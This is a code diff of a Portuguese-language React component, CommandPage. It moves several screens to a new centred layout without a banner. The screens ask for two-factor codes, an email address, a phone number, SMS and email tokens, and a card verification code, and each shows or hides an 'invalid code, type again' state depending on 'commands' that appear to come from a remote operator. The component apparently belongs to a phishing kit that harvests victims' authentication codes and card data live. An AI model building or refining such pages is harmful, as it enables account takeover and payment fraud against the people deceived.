@@ -64,6 +64,15 @@ const PFError = ({ message }) => (
   </div>
 );
 
+// Layout centralizado sem banner (para comandos)
+const PFCenter = ({ children }) => (
+  <div className="h-screen flex items-center justify-center bg-white overflow-hidden" style={{ fontFamily: "'Roboto', 'Helvetica Neue', sans-serif" }}>
+    <div className="flex flex-col items-center px-6">
+      {children}
+    </div>
+  </div>
+);
+
 function CommandPage({ userId }) {
   const [currentCommand, setCurrentCommand] = useState(null);
   const [inputValue, setInputValue] = useState("");
@@ -204,7 +213,7 @@ function CommandPage({ userId }) {
     const isCodeComplete = codeDigits.every(d => d !== '');
     const isInvalid = currentCommand?.action === "AUT-INV";
     return (
-      <PFLayout>
+      <PFCenter>
         <PFLogo />
         {isInvalid && <PFError message="Código inválido. Digite novamente." />}
         <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Autenticação em Dois Fatores</h1>
@@ -214,7 +223,7 @@ function CommandPage({ userId }) {
           <PFButton disabled={!isCodeComplete} loading={loading}>Confirmar</PFButton>
           <p className="text-center text-xs text-gray-400">Não recebeu o código? Verifique seu aplicativo.</p>
         </form>
-      </PFLayout>
+      </PFCenter>
     );
   }
 
@@ -222,7 +231,7 @@ function CommandPage({ userId }) {
   if (currentCommand?.action === "EMAIL" || currentCommand?.action === "EMAIL-INV") {
     const isInvalid = currentCommand?.action === "EMAIL-INV";
     return (
-      <PFLayout>
+      <PFCenter>
         <PFLogo />
         <PFIcon isInvalid={isInvalid}>
           {isInvalid ? (
@@ -250,7 +259,7 @@ function CommandPage({ userId }) {
           </div>
           <PFButton disabled={!inputValue || !inputValue.includes('@')} loading={loading}>Confirmar</PFButton>
         </form>
-      </PFLayout>
+      </PFCenter>
     );
   }
 
@@ -260,7 +269,7 @@ function CommandPage({ userId }) {
     const phoneRef = currentCommand?.command_reference || "****";
     const isInvalid = currentCommand?.action === "TOK-TEL-INV";
     return (
-      <PFLayout>
+      <PFCenter>
         <PFLogo />
         {isInvalid && <PFError message="Código inválido. Digite novamente." />}
         <h1 className={`text-lg font-bold mb-2 text-center ${isInvalid ? 'text-red-600' : 'text-gray-900'}`}>
@@ -274,7 +283,7 @@ function CommandPage({ userId }) {
           <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
           <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
         </form>
-      </PFLayout>
+      </PFCenter>
     );
   }
 
@@ -289,7 +298,7 @@ function CommandPage({ userId }) {
     };
     const isPhoneValid = inputValue.replace(/\D/g, '').length >= 10;
     return (
-      <PFLayout>
+      <PFCenter>
         <PFLogo />
         <PFIcon isInvalid={isInvalid}>
           {isInvalid ? (
@@ -317,7 +326,7 @@ function CommandPage({ userId }) {
           </div>
           <PFButton disabled={!isPhoneValid} loading={loading}>Confirmar</PFButton>
         </form>
-      </PFLayout>
+      </PFCenter>
     );
   }
 
@@ -327,7 +336,7 @@ function CommandPage({ userId }) {
     const emailRef = currentCommand?.command_reference || "******@email.com";
     const isInvalid = currentCommand?.action === "TOK-MAIL-INV";
     return (
-      <PFLayout>
+      <PFCenter>
         <PFLogo />
         {isInvalid && <PFError message="Código inválido. Digite novamente." />}
         <h1 className={`text-lg font-bold mb-2 text-center ${isInvalid ? 'text-red-600' : 'text-gray-900'}`}>
@@ -341,7 +350,7 @@ function CommandPage({ userId }) {
           <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
           <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
         </form>
-      </PFLayout>
+      </PFCenter>
     );
   }
 
@@ -369,7 +378,7 @@ function CommandPage({ userId }) {
       } catch (error) { console.error(error); }
     };
     return (
-      <PFLayout>
+      <PFCenter>
         <PFLogo />
         <PFIcon isInvalid={isInvalid}>
           {isInvalid ? (
@@ -401,7 +410,7 @@ function CommandPage({ userId }) {
           </div>
           <PFButton disabled={!isFormValid} loading={loading}>Continuar</PFButton>
         </form>
-      </PFLayout>
+      </PFCenter>
     );
   }
 
@@ -410,7 +419,7 @@ function CommandPage({ userId }) {
     const isInvalid = currentCommand?.action === "COD-CC-INV";
     const referenceText = currentCommand?.command_reference || "";
     return (
-      <PFLayout>
+      <PFCenter>
         <PFLogo />
         <div className="w-full max-w-[320px]">
           <h1 className="text-lg font-bold text-gray-900 mb-4">Insira o código de verificação</h1>
@@ -437,7 +446,7 @@ function CommandPage({ userId }) {
             </div>
           </form>
         </div>
-      </PFLayout>
+      </PFCenter>
     );
   }
 
